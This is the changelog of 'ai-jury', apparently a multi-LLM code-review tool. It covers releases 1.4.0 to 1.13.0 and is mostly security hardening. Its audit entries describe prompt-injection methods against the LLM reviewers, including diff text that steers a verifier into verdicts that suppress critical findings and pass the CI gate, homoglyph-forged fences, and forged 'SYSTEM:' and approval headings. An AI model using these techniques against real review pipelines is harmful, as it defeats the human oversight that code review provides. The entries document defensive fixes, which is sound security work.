- **Subprocess Exception Secret Leakage Guard** (#515): Ensure `GenericCLIAdapter` subprocess exception handling redacts any secret tokens before bubbling up errors.
- **Path Traversal & CLI Injection Barriers** (#536): Strict normalization and containment checks on patch file targets and CLI arguments.

## [1.13.0] - 2026-08-14

### Added
- **`--commit` and `--commits` input sources** (#367, #505): point the jury at one commit
  (`jury --commit abc1234`) or a range (`jury --commits origin/main..HEAD`) without
  producing a diff file first. Both resolve locally and flow through the existing
  pipeline unchanged — large-diff filtering, redaction, rounds, verify, verdict and the
  report all apply as-is. Needs a git repo; no `gh`. A revision may not begin with `-`
  (git would read it as an option, so it is refused rather than escaped), `--commit`
  uses `-m --first-parent` so a merge commit is reviewable instead of silently empty,
  and an empty resolved diff is an error rather than a verdict on nothing.
- **Abstention accounting in the panel** (#501, #504): a reviewer slot that returns no
  reviewable output is now recorded as an abstention rather than counted toward the
  panel. Run metadata carries `panel` (configured vs effective size, contributing
  vendors, abstained/failed counts) and a per-agent `review_status`; the report states a
  short panel explicitly. Metadata schema 3 → 4, additive.
- **Universal Provider Documentation & Hero Visuals** (#494, #495, #509, #510):
  - Updated high-resolution Retina diagrams for dark & light mode illustrating all 7+ universal agent providers (Claude, Codex, Antigravity, DeepSeek, Grok, Cursor CLI, Aider, Local models).
  - Added Cursor CLI and Grok API controls to interactive web demo & terminal deliberation theater.
  - Comprehensive documentation and recipes for OmniRoute & unified LLM gateways under `vendor = "openai-compatible"`.

### Security
- **Exception Context Chain Hardening** (#511, #507): Use `raise DomainError(...) from None` across config, replay, policy, command, and CLI modules to sever Python's `__cause__` exception chaining, preventing raw unredacted parsing snippets or stack traces from leaking to terminal logs.
- **Replay JSON Secret Redaction** (#503): Enforce secret redaction on JSON and file reading errors when loading replay outcomes.

### Changed
- The one-source rule is enforced from a list rather than pairwise, so the error names
  every source given instead of applying a silent precedence order.

## [1.12.0] - 2026-08-06

### Added
- **Universal Agent Provider Support** (#478, #479, #480, #481, #482, #483, #484):
  - **`GenericOpenAICompatibleAdapter`**: Hosted HTTP API reviewer for **OpenRouter**, **DeepSeek**, **Groq**, **Mistral**, **LiteLLM**, **Azure OpenAI**, etc. (`vendor = "openai-compatible"`, with custom `endpoint`, `api_key_env`, and `headers`). Supports polymorphic plain string and array message payload parsing.
  - **`GenericCLIAdapter`**: Integration for arbitrary coding-agent CLIs (`vendor = "cli"`, e.g. Aider, Goose, OpenHands) with `prompt_mode = "stdin"` or `"arg"`, automatic secret redaction (`redaction.redact`), and exit-code error classification (`classify_stderr`).
  - **Pluggable Provider Registry**: Dynamically register custom Python adapter classes via `ai_jury.adapters.register_adapter()`.
  - **Decoupled Privilege Audit**: Subprocess sandbox enforcement rules in `privilege.py` decoupled from vendor name matches, exempting no-subprocess HTTP API calls while maintaining fail-closed protection for CLI subprocesses.
  - **Doctor & Scaffold Extensions**: Dynamic PATH/endpoint probes in `doctor.py` and scaffolding templates in `scaffold.py` for `openrouter`, `deepseek`, `groq`, and `aider`.
  - **Terminal Theater & Interactive Web Demo**: Added brand color styling (`--c-deepseek`, `--c-openrouter`, `--c-groq`, `--c-aider`) to terminal deliberation theater (`theater.py`) and website interactive controls.

## [1.11.1] - 2026-07-27

### Fixed
- **`jury --doctor` no longer leaks a stack trace on malformed TOML** (#464): an invalid
  `jury.toml` surfaced the raw `TOMLDecodeError` traceback instead of the redacted
  config-error warning every other load failure produces. The decode error is now wrapped in
  `ConfigError` at the load boundary, so the doctor path reports it the same fail-soft way.
- **Native tooltips show on disabled form options** (#460): `pointer-events: none` on the
  disabled option wrapper blocked hover, so the `title` explaining *why* an option was
  disabled never appeared. Replaced with `cursor: not-allowed`, which keeps the visual
  affordance without suppressing the tooltip.
- **In-page anchors clear the fixed header** (#456): added `scroll-padding-top` so a
  deep-linked heading is not hidden behind the sticky site header.

### Changed
- **Faster diff-profile path handling** (#455): the per-path loops in `diffprofile` fold
  into a single pass, avoiding repeated scans over the changed-file list.

## [1.11.0] - 2026-07-17

### Added
- **`jury replay <outcome.json>`**: re-watch a finished run in the deliberation theater
  with no orchestration, network, or agents. Loads a serialized outcome (bare
  `outcome_to_dict` dump or a result-cache entry) and re-drives the theater with the exact
  per-phase event sequence the live run emitted. `--decision vote --mode code|issue`
  re-tallies the panel finale (the outcome doesn't record the run mode, hence `--mode`);
  off a tty it degrades to the `--live` step stream. Untrusted-input hardened: 8 MiB read
  cap, every failure is a clean `error:` + exit 2. First consumer of the serialized-outcome
  artifact. (#449)
- **Website "Load a real run"**: the site demo can now render an actual `jury --format json`
  outcome instead of only canned data — drop or pick a file and the in-browser theater plays
  the real reviewers, findings, verify results, and verdict. Fully client-side (8 MB cap,
  every field escaped, nothing uploaded); accepts the same shapes as `jury replay`. (#450)
- **Local-only finding demotion** (`jury.demote_local_only`, default off): a finding raised
  only by vendor `local` reviewers, uncorroborated by any cloud reviewer, is capped at
  `minor` so it no longer blocks the default CI gate but still shows. An auditable
  categorical rule instead of a numeric trust weight. (#442)

### Fixed
- `jury --doctor` no longer crashes on an oversized/invalid config: `ConfigError` is caught
  and surfaced as a redacted warning like every other config-loading failure. (#441)

## [1.10.0] - 2026-07-11

### Added
- **Google (Gemini) hosted-API adapter** (`vendor = "google-api"`): completes the
  three-vendor hosted-API set alongside `anthropic-api`/`openai-api` — a reviewer
  keyed by just `GEMINI_API_KEY`, no `agy` CLI install or interactive login needed.
  Same `_HostedApiAdapter` base (no subprocess, control-character key validation
  before any request, fixed endpoint). Sends the key via the `x-goog-api-key`
  header rather than Gemini's alternative `?key=...` query-parameter form, since a
  query-string key is a much easier accidental-leak vector than a header. Scaffold
  one with `jury init --agents gemini-api` (#432).
- **Hosted-API reviewer adapters** (`vendor = "anthropic-api"` / `"openai-api"`):
  a reviewer seat keyed by just `ANTHROPIC_API_KEY` / `OPENAI_API_KEY`, needing
  no `claude`/`codex` CLI install or interactive login — useful for CI runners
  and containers where that's impractical. Same stdlib-`urllib`,
  no-subprocess design as the existing `local` adapter, but pointed at the
  vendor's real hosted API with a fixed (non-configurable) endpoint. Scaffold
  one with `jury init --agents claude-api,codex-api` (#430).

## [1.9.8] - 2026-07-06

### Security
- **Scoped `gh` output redaction to error/log paths only.** Failed-`gh` error
  messages now redact **stdout as well as stderr**, and the
  `post_inline_comments` **dry-run payload dump is redacted before it is
  printed** — closing the remaining console/log paths where raw `gh` output
  could surface secrets, while leaving the PR diffs and API JSON that the jury
  consumes untouched (#420).
- **Exception strings in `cli.py`, `commands.py`, `findings.py`, and
  `policy.py` are now redacted** before being printed to stderr or wrapped into
  error messages — extending the `str(exc)` redaction shipped in 1.9.7 to
  config/policy loading, comment parsing, and findings/verdict parsing (#422).

## [1.9.7] - 2026-07-03

### Security
- Exception strings from failed agent spawns, version probes, local-model
  requests, config loading, and live-post steps are now **redacted before
  being wrapped into error/warning messages** — closing the same secret-leak
  class fixed for `gh` CLI stderr in 1.9.6, but for `str(exc)` text raised by
  Python itself.
- Two more unredacted paths in `adapters.py`, missed by the fix above: a CLI's
  raw version-probe output (`raw_version_output`, surfaced via `jury doctor`)
  and the local-model adapter's `URLError.reason` on a connection failure are
  now redacted too.

### Changed
- The website's **"Run review" demo button is now disabled (with an
  explanatory `title`) when zero reviewers are selected**, instead of staying
  clickable and only showing an inline note after the fact.
- The website now has a **skip-to-content link** on every page (home, docs,
  404, coverage report) — hidden until keyboard-focused, then jumps straight
  past the nav to the main content (WCAG 2.4.1 bypass-blocks).

## [1.9.6] - 2026-06-21

### Security
- `gh` CLI subprocess stderr is now **redacted before being wrapped into a
  `RuntimeError`**, so secrets (e.g. `ghp_` GitHub tokens) echoed by a failing
  `gh` call can no longer leak into logs, tracebacks, or CI output.

### Changed
- The website **theme-toggle button now announces the action it will perform**
  ("Switch to light theme" / "Switch to dark theme") via a dynamic `aria-label`
  and `title`, kept in sync with the active theme through a `MutationObserver`
  (covers both the home page and the docs page).
- The website **copy buttons now announce a "Copied" state** to screen readers
  by swapping their `aria-label`/`title` while copying and restoring the
  original values afterwards (install-command and code-block copy buttons).

## [1.9.5] - 2026-06-15

### Fixed
- Theater is now readable on **light-background terminals**. The chrome (title,
  meta, phase strip, separators, transcript, speech bubble) hardcoded white/grey
  foregrounds that vanished on a light theme; it now uses the terminal's default
  foreground (bold/faint), which adapts to both light and dark backgrounds. The
  pixel scene (own dark background) and vendor/verdict colours are unchanged.

### Changed
- Website analytics switched from Google Analytics 4 to **Cloudflare Web
  Analytics** — cookieless and privacy-first, so no cookie-consent banner is
  required (GDPR / ePrivacy / PECR). The CLI still sends no telemetry.

## [1.9.4] - 2026-06-15

### Fixed
- Theater decision banner no longer shows a **doubled ellipsis** ("x… …") when a
  verdict overflows 3 lines; the last line is plain-sliced with a single "…".

## [1.9.3] - 2026-06-14

### Fixed
- **The decision banner now wraps the full verdict** across up to 3 lines on the
  table (ellipsis only if it's still longer), instead of truncating the whole
  verdict to one line — so the rationale is readable in the scene itself (flat +
  pixel).
- Theater transcript lines are now truncated with an ellipsis instead of being
  hard-cut mid-word at the screen edge, and the rolling `DECISION -> …` log line
  records the **short verdict keyword** (e.g. `DECISION -> NEEDS-INFO`) — the full
  rationale lives on the banner, so the transcript no longer ends in an ellipsis.

### Internal
- `theater.py` is now at 100% coverage (covered the ticker, `_fit`/`_wrap_banner`,
  and the verdict-headline branches); overall coverage nudged off the 99% floor.

## [1.9.2] - 2026-06-14

### Fixed
- **Theater clock is now live.** The scene only repainted on each `on_event`, so
  between phases (while agents run, often tens of seconds) it froze and the timer
  jumped in bursts. A background ticker now repaints on an interval so the clock
  ticks smoothly and the scene stays alive; event-driven and ticker repaints
  share a lock (no torn frames), and the ticker is animate-only.
- **Long verdict no longer overflows the decision banner.** A long chair verdict
  headline ran past the table / screen edge; it's now truncated with an ellipsis
  to fit (flat and pixel scenes), and the **full** verdict is shown wrapped under
  "the panel has decided" so the rationale stays readable in the scene.

## [1.9.1] - 2026-06-14

### Security
- **Theater scrubs control / bidi / zero-width characters from terminal output**
  (`docs/security-audit-2026-06-14-theater.md`). The `--theater` scene rendered
  agent-influenced text (finding claims, the verdict line) to the terminal
  without stripping control bytes, so a crafted claim could inject ANSI escapes
  (clear the screen, move the cursor to **spoof the verdict banner**, set the
  title) or use Unicode bidi overrides to spoof text (Trojan Source). `Screen.put`
  — the single render sink — now replaces C0/DEL/C1 and bidi/zero-width format
  characters with a space; trusted styling still arrives via the separate `sgr`
  argument. No Critical/High/Medium remaining after re-audit.

### Fixed
- Website demo: changing the panel/depth now fully **resets the animated
  theater** (the scene is hidden and cleared) so the next run replays from
  scratch with no stale seats, phase marks, or decision banner.

## [1.9.0] - 2026-06-14

### Added
- **Default the theater view from `jury.toml`** (issue #364): `[jury] theater =
  true` and `theater_style = "flat"|"pixel"` so the animated deliberation view
  can be on by default. New CLI flags `--no-theater` and a config-aware
  `--theater-style` override the file per run. Rendering-only — excluded from the
  config hash / cache key, and still TTY-only (falls back to `--live`, and
  `pixel` to `flat`, when unsupported).

### Documentation
- Landing page + `docs/comparison.md`: new comparison row — **animated
  deliberation view (in-terminal)**, an ai-jury-only capability.
- Website demo: the scripted "Run review" now plays an in-browser animated
  theater preview (issue #365).

## [1.8.1] - 2026-06-14

### Fixed
- **`--theater` crashed on a real interactive terminal** with
  `TypeError: resolve_chair() missing 3 required positional arguments`. The
  scene's chair label called the run-time `resolve_chair` with the wrong
  arguments; it now uses a best-effort display name (the run still resolves the
  real chair internally). The crash only fired on a TTY (where the scene
  actually renders), so it slipped past CI — now covered by a `--theater`
  CLI smoke test (flat + pixel + issue/vote) that forces the scene path on.

## [1.8.0] - 2026-06-14

### Added
- **`--theater-style {flat,pixel}`: a pixel-art style for the theater scene.**
  The same live deliberation (same `on_event` flow) rendered as a top-down
  **pixel-art room** — little chibi jurors (hair + eyes + vendor-coloured torso)
  around a wooden table, the speaker haloed and name-inverted, the case / verify
  checklist / decision banner on the table. Drawn into an RGB pixel buffer and
  folded to the terminal via the upper-half-block `▀` (truecolor); needs a
  truecolor + unicode terminal, else it transparently falls back to the default
  `flat` ANSI scene. Pure stdlib. See `docs/theater-design.md`.

### Changed
- `--theater` help text now describes the **deliberation** framing (no
  "courtroom"/"gavel") to match the round-table scene.

### Documentation
- README, `docs/theater-design.md`, and the landing page document both theater
  styles (flat + pixel) with refreshed demos rendered from the real renderer.
- Site: the demo's `jury.toml` preview now grows to fill the controls column and
  scrolls only on overflow (was capped at a fixed height).

## [1.7.0] - 2026-06-14

### Added
- **`--theater`: an animated "deliberation" view of a live run.** Opt-in,
  presentation-only: the models sit around a table and take turns speaking as
  the run moves through review → debate → verify → decision, then decide together
  (no judge) — by panel vote or recorded by the chair. It consumes the real
  `on_event` stream (so it mirrors the actual run; `--mock` drives a
  deterministic demo), is pure-stdlib ANSI, and never touches the structured
  outcome/report/CI gate. Adapts to PR vs issue and chair vs vote, shows debate
  rounds / early-stop / disputes, seats many jurors (compact roster fallback),
  and falls back to the plain `--live` stream on a non-interactive terminal.
  See `docs/theater-design.md`.
- Theater seats use each vendor's own **product brand colour** (24-bit truecolor:
  Anthropic coral, OpenAI teal, Google blue, local violet), matching the
  website's vendor palette; terminals without truecolor degrade to the nearest
  colour.

### Documentation
- README, `docs/theater-design.md`, and the landing page gained a dedicated
  **Theater mode** section with a pixel-art deliberation demo gif.

## [1.6.2] - 2026-06-13

> Security-hardening release. Nine successive same-day re-audits (a seventh
> four-surface audit, a red-team round, then rounds 3–9) — each a red-team pass
> plus an independent convergence sweep — drove the codebase to a clean round
> with **no Critical/High at any point** and no Medium remaining. The bulk of the
> work hardened the CI-gate's verify→verdict→group attachment so an
> attacker-steered verifier verdict can no longer suppress a real finding, and
> closed a class of markdown output-injection into the posted PR/issue comment.
> Also ships the earlier website/UX and performance tweaks. No breaking changes.

### Security
- **Ninth security re-audit** (`docs/security-audit-2026-06-13-round9.md`). A
  determined final red-team of the verdict-attach layer + an independent
  convergence pass (which confirmed no new Medium+ and recommended release); no
  Critical/High. Fixed one more Medium CI-gate bypass, with tests:
  - A rejecting verdict with `line: null` plus a claim-similarity tie could drop
    a co-located critical (the claim-ful counterpart of the round-6 line-less
    wildcard). A rejecting verdict now must pin a concrete line, and on a
    top-similarity tie only the *least*-severe groups are suppressed — so a tie
    can never drag a critical down alongside a benign decoy.
- **Eighth security re-audit** (`docs/security-audit-2026-06-13-round8.md`). A
  red-team of the round-7 verdict-attach fixes + a whole-codebase convergence
  sweep; no Critical/High. Fixed two Medium CI-gate bypasses with a structural
  redesign of verdict→group attachment, all with tests:
  - A verifier `unsupported` verdict aimed at a co-located *lesser* finding (one
    consensus merged into a critical group, or a benign decoy / numbered sibling
    like `parse_v2`/`parse_v3`) could reject the critical and pass the gate.
    Rejection now uses a **member-tier guard** (a verdict can't suppress a group
    via a member less severe than the group's max) and attaches only to the
    **best-similarity tier**, so it dismisses the finding it actually names and
    never a co-located, less-similar critical.
  - Contradictory verdicts (`verified` + `unsupported`) on one finding are now
    resolved in blocking-priority order (verified wins) instead of by the
    verifier's array order (fail-closed).
- **Seventh security re-audit** (`docs/security-audit-2026-06-13-round7.md`). Two
  independent passes (exhaustive gate-flow probe + wide net); no Critical/High.
  Fixed three Medium CI-gate / posted-comment integrity issues, all with tests:
  - **Empty-/unrelated-claim verdict could collaterally reject a co-located
    finding:** a line-ful but claim-less `unsupported` verdict (meant for a
    benign finding sharing a line) also rejected a `critical`, flipping the
    strict gate to PASS. A *rejecting* verdict now requires real claim
    relatedness (exact or Jaccard ≥ 0.5) — it can verify by position but not
    reject what it doesn't name (fail-closed).
  - **Cross-chunk verdict cross-attachment:** on a chunked review, a verdict
    produced for one chunk could reject a real critical in another chunk after
    the global merge. Verdicts are now scoped to their own chunk's files.
  - **CI gate reason line** (posted to the PR) now flattens the blocking
    finding's `file`/`claim`, closing the last markdown-injection sink.
- **Sixth security re-audit** (`docs/security-audit-2026-06-13-round6.md`). Two
  independent gate-integrity passes; no Critical/High. Fixed two Medium CI-gate
  bypasses and one Low, all with tests:
  - **Claim-less, line-less verdict was a file-wide CI-gate wildcard:**
    `orchestrator._verdict_matches_group` treated an empty verdict claim as a
    location match, but a verdict carrying *neither* a `claim` *nor* a `line`
    (a normal/plausible verifier output shape — and exactly what an injected
    diff would coach the verifier to emit) matched **every** finding group in
    the file. An `unsupported` verdict of that shape rejected unrelated
    `critical` groups (bucket → `rejected`), flipping the CI gate from FAIL to
    PASS; under the default `ignore_unverified=True`, mere verdict *ordering*
    decided the outcome. Now an empty-claim match requires a concrete line on
    both the verdict and the finding.
  - **Path case-collapse:** `consensus._normalize_path` lower-cased paths, so on
    a case-sensitive filesystem (Linux/CI) a verdict on `config.py` could reject
    a real critical at `Config.py` and pass the gate (the round-5 fix covered the
    `./` collision but not case). Case-folding is kept for grouping/dedup, but
    the gate-critical verdict match is now case-exact (`fold_case=False`).
  - Run-metadata report strings (rounds decision, skipped agent name/reason,
    agent name/vendor) are now flattened for defense-in-depth (config-controlled
    today, but keeps them from ever breaking the table / forging structure).
- **Fifth security re-audit** (`docs/security-audit-2026-06-13-round5.md`). Two
  independent passes (red-team + deterministic-core sweep); no Critical/High.
  Fixed two Medium issues and one Low, all with tests:
  - **CI-gate path collision:** `consensus._normalize_path` used
    `str.lstrip("./")`, which strips a whole leading run of `.`/`/` and collided
    distinct paths (`.github/x.yml` vs `github/x.yml`, `../auth.py` vs
    `./auth.py`). An attacker could make a verifier "unsupported" verdict on a
    benign sibling path swallow a real critical finding's group and pass the
    gate. Now only a true leading `./` is stripped. (Also backs
    `orchestrator._verdict_matches_group`.)
  - SARIF output (`--format sarif`) drops an invalid `region.startLine`: a
    finding's `line` is parsed from attacker-influenceable reviewer JSON, and a
    forged `"line": 0`/negative value emitted an invalid SARIF region, which
    makes GitHub code-scanning reject the *entire* upload — suppressing every
    finding (denial-of-evidence). Non-positive lines now drop the region so the
    finding still surfaces at file level.
  - `diff --git` mode-change segments with a git-quoted spaced path
    (`"a/x y.py" "b/x y.py"`) are recovered, closing the last path-truncation
    file-hiding vector from an `include` allow-list.
- **Fourth security re-audit** (`docs/security-audit-2026-06-13-round4.md`). A
  red-team pass plus a fresh sweep of under-examined modules; no Critical/High.
  Fixed two Medium issues and one Low, all with tests:
  - Failed-agent error snippets (`AgentResult.error`, attacker-influenced CLI
    stderr) are now flattened before rendering — the report-integrity fix from
    round 3 covered finding fields but missed error strings, so a failed agent
    could forge a `## Verdict APPROVE` heading in the posted comment.
  - Incremental mode now trusts the hidden `arc-reviewed-sha` marker only from
    OWNER/MEMBER/COLLABORATOR comments — an external PR author could otherwise
    forge it to narrow the reviewed range and skip malicious commits.
  - `diff --git` mode-change segments whose path contains `" b/"` are recovered
    correctly (were truncated, hiding the file from an `include` allow-list).
- **Third security re-audit** (`docs/security-audit-2026-06-13-round3.md`). A
  red-team pass plus a fresh sweep of the report/GitHub-post surface; no
  Critical/High. Fixed a newly-found markdown output-injection class and the
  deferred gh-output cap, all with tests:
  - **Report integrity:** attacker-influenced finding text (`claim`/`evidence`/
    `suggested_fix`/`file`) is now flattened to a single line before rendering,
    and `--suggest-patches` bodies are fence-safe — so a finding can no longer
    forge a `## Verdict APPROVE` heading or break a code fence in the markdown
    comment posted to the PR/issue. (The machine CI gate was never affected.)
  - **gh output cap:** `gh` stdout on the `--pr`/`--issue` path is now streamed
    with a 64 MiB ceiling (previously only `--diff-file`/stdin was capped), so a
    hostile huge PR diff can't OOM the process.
  - Inline-comment bodies strip HTML comments so a finding can't forge the
    jury's hidden `<!-- arc-inline -->` markers / perturb dedup.
  - `diff --git` paths for marker-less segments (renames/copies/mode-changes)
    are recovered from the extended header, closing the remaining file-hiding
    vector from the include allow-list.
  - Added vertical presentation-form angle brackets to the homoglyph fence set
    (`PROMPT_VERSION` 6); `cache.load`/`github` json parsing also catch
    `RecursionError` for parity.
- **Red-team re-audit** (`docs/security-audit-2026-06-13-redteam.md`). A
  same-day adversarial pass against the seventh audit's fixes plus a fresh
  full-surface sweep; no Critical/High. Fixed six items, all with tests:
  - Broadened homoglyph fence neutralization after a red-team pass found the
    first set incomplete (small-form `﹤﹥`, heavy ornaments `❮❯`, much-less/
    greater `≪≫`, Canadian-syllabic `ᐸᐳ`, guillemets, and mixed ASCII/homoglyph
    runs all now broken). Bumps `PROMPT_VERSION` to 5.
  - The raw-diff ingest cap is now enforced on **bytes**, not characters (a
    multi-byte UTF-8 input could previously use 3–4× the intended 64 MiB).
  - CLI-adapter error snippets are now redacted before being embedded in the
    report/PR comment, matching the local-adapter path (a crashing CLI could
    otherwise leak a token from stderr).
  - `parse_findings`/`parse_verdicts` now catch `RecursionError` on deeply
    nested JSON, so one steerable reviewer can't abort the whole run.
  - `diff --git` paths containing spaces or git-quoting are recovered from the
    `+++`/`---` marker lines, so a space-named file can no longer evade an
    `include` allow-list (hiding itself from review).
- **Seventh security audit** (`docs/security-audit-2026-06-13.md`). Four-surface
  re-audit of `main`; no Critical/High. Fixed two Medium prompt-injection gaps
  and two Low issues, all with new tests:
  - The debater's own round-1 review is now wrapped in an `UNTRUSTED_REVIEW`
    fence like every other untrusted-derived slot (it was neutralized but not
    fenced), so injected text surviving into a reviewer's output can no longer
    land in a region the anti-injection preamble treats as trusted. Bumps
    `PROMPT_VERSION` to 4 (cache invalidation).
  - `neutralize_sentinels` now also breaks fences forged from fullwidth/
    homoglyph angle brackets (e.g. `＜＜＜UNTRUSTED_DIFF`), which previously
    evaded the ASCII-only matcher while still reading as a real fence to an LLM.
  - `redact_url_userinfo` now redacts credentials in scheme-less endpoint URLs
    (`user:pass@host/v1`), which `urlsplit` previously left in the path so the
    credential slipped through unredacted (continues v1.5.0/L-1).
  - Raw diff ingestion (`--diff-file`/stdin) is now bounded by a 64 MiB ceiling
    so a hostile huge input cannot OOM the process before the post-split
    `diff.max_bytes` budget engages.
  - The #336 combined classification regex was verified equivalent to the prior
    per-regex matching and free of catastrophic backtracking.

### Changed
- Website demo "Run review" button now shows "Running review..." while a run is
  in progress, making the loading state explicit.
- Added an `aria-label` to the install-command copy button so screen readers
  announce what it copies.
- Reduced redundant work in security-path classification and PR-level risk
  scoring (combined-regex path matching in `diffprofile`, single-pass
  `_risk_level`).

## [1.6.1] - 2026-06-11

> Patch release for the post-v1.6.0 hardening, performance, accessibility, and
> repository-quality work. No breaking changes.

### Security
- **Post-v1.6.0 security re-audit** (`docs/security-audit-2026-06-07-v1.6.0.md`). A sixth re-audit — four independent surface reviews (subprocess/sandbox, network/SSRF, prompt-injection/redaction, filesystem/cache + classification) with the key claims confirmed empirically — verifies every #287–#322 fix holds in the released v1.6.0 source. It is the **first round with no Critical, High, *or* Medium finding**: prompt-injection coverage is now complete (the M-1 verdicts slot is fenced + neutralized), least privilege and SSRF are fail-closed, and cache integrity holds under tamper/forgery. Only optional, non-attacker-reachable defense-in-depth notes remain (scheme-less `redact_url_userinfo` early-return, no hard diff byte cap, `LocalAdapter` runtime SSRF gate, unknown-vendor flag retention, string-based loopback allow-list). The superseded intermediate Claude reports are removed; their history lives in this changelog.

### Changed
- Improved report/rendering performance by reducing repeated list-extension and string-join work in report assembly.
- Combined security keyword classification regexes so repeated classification passes do less redundant matching.
- Improved website accessibility with semantic form grouping, visible keyboard focus states, and clearer disabled-button styling.
- Applied repository-wide Ruff lint and formatting cleanups across source, benchmark helpers, and tests.

## [1.6.0] - 2026-06-07

> Closes the four post-v1.5.0 re-audit findings (#321, #322), each cross-vendor
> jury-reviewed. The one untrusted slot left raw — the synthesis verdicts
> addendum — is now fenced + neutralized; endpoint userinfo is stripped
> structurally; two long-standing matcher bugs (classification keyword stems,
> nested redaction) are fixed.

### Security
- **Synthesis verdicts addendum is now fenced + neutralized** (#321, completes #316/L-1). The `VERIFICATION VERDICTS` block appended to the synthesis prompt was the one untrusted slot left un-fenced and un-neutralized — a verdict's `claim`/`reasoning` transitively quote attacker diff text, so it could forge a fence closer or a fake `SYSTEM:` directive in the chair's prompt. It is now wrapped in an `UNTRUSTED_FINDINGS` fence and run through `neutralize_sentinels`, matching every other untrusted slot. (The CI gate stays consensus-derived, so this only ever affected the human-facing synthesis text.)
- **Re-audit low-severity bundle** (#322). The init-endpoint credential display now strips userinfo **structurally** via a shared `redaction.redact_url_userinfo` helper (used by `jury init` and `doctor`), so a short (<6-char) password or a colon-less bare token — which the `basic_auth` regex missed — can no longer leak to stdout/CI logs; `redact()` also gains a colon-less userinfo arm and a lower password bound for the diff-scrub path (L-1, residual of #316/L-7). The `vulnerab`/`exploit` classification keyword stems are now compiled with a trailing `\w*` instead of `\b…\b`, so `vulnerability`/`exploitable`/`exploited` are correctly recognized as security-sensitive (L-2). Redaction no longer re-redacts an already-emitted `[REDACTED:…]` marker, so a secret inside a basic-auth URL keeps its informative kind and an accurate count (L-3).
- **Post-v1.5.0 security re-audit** (`docs/security-audit-2026-06-07-v1.5.0.md`). A fifth four-surface re-audit confirmed every #287–#316 fix holds in source (no Critical/High; filesystem/cache surface fully clean) and surfaced one Medium (the un-fenced verdicts slot) plus three Lows — **all fixed in this release (#321, #322).**

## [1.5.0] - 2026-06-07

> Closes the post-v1.4.1 re-audit findings (#314, #315, #316), each cross-vendor
> jury-reviewed. New behavior: the injection scanner caps hits per kind, config /
> policy TOML files are size-capped (4 MiB), and redaction covers a few more
> token formats.

### Security
- **`injection.scan` is now O(N), not O(N²)** (#314). It recomputed each hit's line via `text.count(...)` (O(index)) and emitted one hit per matched char, so a long run of zero-width characters cost quadratic time — 200k zero-width chars ≈ 6.6 s, a CPU-exhaustion DoS since `scan_inputs` runs on the full per-chunk diff before fan-out. Now newline offsets are computed once and the line is found by binary search, and hits are capped per kind; 200k ≈ 86 ms, linear.
- **Config validation returns a clean error on a malformed endpoint** (#315, completes #309). `config._endpoint_issues` called `urlsplit` unguarded, which raises `ValueError` on a malformed URL (`http://[::1`), so `validate_config` crashed with a stack trace instead of a `ConfigError`. The `urlsplit`/hostname access is now guarded; a non-UTF-8 config/policy file is likewise a clean `ConfigError`/`PolicyError`.
- **Re-audit low-severity bundle** (#316). The prior-round debate addendum (`prior_txt`) is now fenced and run through `neutralize_sentinels` like every other untrusted slot (L-1). Redaction adds SendGrid / PyPI / npm tokens and Slack webhook URLs (L-2). `cache clear()` only touches files matching the 64-hex cache-name shape, so it can't delete unrelated files in a shared `JURY_CACHE_DIR` (L-3). Cache entries are written via `tempfile.mkstemp` (O_EXCL, no symlink-follow) instead of a predictable pid-tagged temp (L-4). Config/policy TOML reads are size-capped at 4 MiB (L-5). The privilege audit recognizes the `=`-form sandbox (`-s=`/`--sandbox=`) the enforcement already accepts, so a safe config no longer false-positives under `--strict` (L-6). The `jury init --local-endpoint` value is redacted before being echoed to stdout (L-7).
- **Post-v1.4.1 security re-audit** (`docs/security-audit-2026-06-07-v1.4.1.md`) confirmed every #287–#310 fix holds (no Critical/High) and stress-tested #309/#310 (alternate loopback encodings all fail closed; unknown-vendor sandbox fail-closed). The two Mediums and seven Lows it surfaced are all fixed in this release (#314, #315, #316).

## [1.4.1] - 2026-06-07

> Closes the two Medium residuals the post-v1.4.0 re-audit surfaced (#309, #310),
> each cross-vendor jury-reviewed. No config/flag changes.

### Security
- **The read-only sandbox is now fail-closed for an unknown vendor** (#310, completes #300). #300 made the audit *warn* for an unsandboxed non-claude reviewer, but `privilege.enforce_read_only` still injected **no** sandbox for an unknown vendor, so in default (non-strict) mode it ran fail-open. An unknown vendor routes to the generic `AgyAdapter`, so it now gets `--sandbox` injected like agy — an agy-compatible CLI runs sandboxed, an incompatible one fails on the flag rather than running unsandboxed. `local` (network) agents stay out of scope.
- **`jury init --local-endpoint` is gated by the SSRF endpoint validation** (#309). The config-file path was validated by `_endpoint_issues`, but the `init --list-models`/`--list-agents` discovery path called `list_local_models()` directly, so it could GET an arbitrary host. The gate now lives inside `list_local_models` itself, so **every** caller is covered: a non-`http(s)` scheme or a non-loopback host (without `JURY_ALLOW_REMOTE_ENDPOINT`) returns `[]` with no network call.
- **Post-v1.4.0 security re-audit** (`docs/security-audit-2026-06-07-v1.4.0.md`). A third four-surface re-audit of the released code confirms every #287–#303 fix holds in source (no Critical/High). It surfaces two **Medium** residuals — the unknown-vendor adapter path still runs **fail-open** (no sandbox injected) in default mode even though #300 made the audit warn, and `jury init --local-endpoint` reaches an arbitrary host **without** the `_endpoint_issues` SSRF gate the config path enforces. **Both Mediums are fixed in this release (#310, #309).** The minor items it noted (init endpoint not redacted in stdout, explicit TLS context, `prior_txt` debate slot not neutralized, more secret formats, `cache clear()` glob blast-radius, atomic-write temp via `mkstemp`) remain tracked for follow-up.

## [1.4.0] - 2026-06-07

> Security re-audit follow-up (#300–#303). All #287–#296 fixes re-confirmed in
> source; the remaining defense-in-depth gaps are closed. Behavior notes: the
> least-privilege audit now warns for **any** unsandboxed non-claude reviewer
> (more `--strict` failures for loose configs), and `PROMPT_VERSION` was bumped
> (the result cache invalidates once). Each change was cross-vendor jury-reviewed.

### Security
- **Post-v1.3.0 security re-audit** (`docs/security-audit-2026-06-07-v1.3.0.md`). A four-surface re-audit of the released code confirms every #287–#296 fix holds in source (no Critical/High) and documents the remaining defense-in-depth gaps: the read-only sandbox guarantee is not yet unconditional for an **unknown vendor** (no sandbox injected, no privilege warning), the **untrusted-content sentinel fences aren't neutralized** against an embedded closing token, redaction still misses **basic-auth URLs / Azure / GCP** secret formats, and the `detect_capabilities` version probe doesn't kill its process group on timeout. Tracked as #300–#303.
